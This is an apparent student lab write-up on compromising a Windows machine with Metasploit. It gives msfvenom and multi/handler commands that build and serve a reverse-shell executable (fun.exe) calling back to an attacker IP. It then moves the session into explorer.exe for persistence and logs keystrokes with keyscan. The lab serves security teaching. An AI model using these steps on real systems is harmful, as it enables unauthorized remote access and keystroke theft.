# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/04cdb2ad-171d-4bc8-9f3b-de13c01bed03)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/12d68b0b-ae6f-49f8-ad66-22ee7d3b6d54)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/1b07c03c-fc3d-4f0c-b6f7-dbaec901978c)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/a76c6064-4e3a-4e8f-a6c8-701a0aae22ac)

Check the status of apache2

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/114ded0d-212a-480a-809c-1816157058f2)

Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/b1f3e83e-c94b-4315-8c16-e1c501b08cdc)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/3f2f692a-0757-4c22-86db-8fffef3677d6)

Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/2d555ca3-7a9e-49df-9330-7a2c602421b2)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/6a3d422d-0ce4-46a9-99eb-f7a1e5135b7d)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/50aa8203-6af7-48f5-8c89-15c8093b5821)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Srujana0303/Compromising-windows-using-Metasploit/assets/132996836/969c8b8d-6972-43ed-ba74-4e847bf277aa)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
